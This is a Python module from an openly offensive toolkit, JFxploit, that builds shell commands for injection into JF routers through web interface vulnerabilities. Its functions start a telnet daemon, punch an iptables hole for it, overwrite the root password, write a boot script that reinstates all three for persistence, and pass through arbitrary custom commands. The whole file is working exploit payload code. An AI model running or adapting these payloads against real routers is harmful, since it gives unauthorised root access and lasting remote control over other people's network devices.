# JFxploit — CLI toolkit for exploiting web interface vulnerabilities in JF routers.
# Copyright (C) 2026 JFC-Group (https://github.com/JFC-Group)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""
Shell command builders for each exploit action.
Returns lists of shell command strings that get joined and injected.
"""


def telnet_commands(port: int = 23) -> list[str]:
    return [f"/usr/sbin/telnetd -p {port}"]


def iptables_commands(port: int = 23) -> list[str]:
    check = f"/pfrm2.0/bin/iptables -C fwInBypass -p tcp --dport {port} -m ifgroup --ifgroup-in 0x1/0x1 -j ACCEPT 2>/dev/null"
    insert = f"/pfrm2.0/bin/iptables -I fwInBypass -p tcp --dport {port} -m ifgroup --ifgroup-in 0x1/0x1 -j ACCEPT"
    return [f"{check} || {insert}"]


def root_pass_commands(password: str) -> list[str]:
    safe = password.replace("'", "'\\''")
    return [f"printf '{safe}\\n{safe}\\n' | passwd root"]


def persist_commands(root_pass: str, telnet_port: int = 23) -> list[str]:
    safe_pass = root_pass.replace("'", "'\\''")
    script_path = "/flash2/pfrm2.0/etc/customInit"
    iptables_rule = (
        f"/pfrm2.0/bin/iptables -C fwInBypass -p tcp --dport {telnet_port}"
        f" -m ifgroup --ifgroup-in 0x1/0x1 -j ACCEPT 2>/dev/null"
        f" || /pfrm2.0/bin/iptables -I fwInBypass -p tcp --dport {telnet_port}"
        f" -m ifgroup --ifgroup-in 0x1/0x1 -j ACCEPT"
    )
    lines = [
        "mkdir -p /flash2/pfrm2.0/etc",
        (
            f"printf '#!/bin/sh\\nsleep 60\\n"
            f"/usr/sbin/telnetd -p {telnet_port}\\n"
            f"{iptables_rule}\\n"
            f"printf \\''{safe_pass}\\\\n{safe_pass}\\\\n\\'' | passwd root\\n"
            f"' > {script_path}"
        ),
        f"chmod +x {script_path}",
        "touch /flash/telnetEnable",
        "rm -f /flash/telnetDisableACS",
    ]
    return lines


def build_payload(
    actions: list[str],
    root_pass: str,
    telnet_port: int = 23,
    custom_cmds: list[str] | None = None,
) -> list[str]:
    """Assemble shell commands for the requested actions."""
    cmds: list[str] = []
    if "telnet" in actions or "all" in actions:
        cmds.extend(telnet_commands(telnet_port))
    if "iptables" in actions or "all" in actions:
        cmds.extend(iptables_commands(telnet_port))
    if "rootpass" in actions or "all" in actions:
        cmds.extend(root_pass_commands(root_pass))
    if "persist" in actions or "all" in actions:
        cmds.extend(persist_commands(root_pass, telnet_port))
    if "custom" in actions and custom_cmds:
        cmds.extend(custom_cmds)
    return cmds
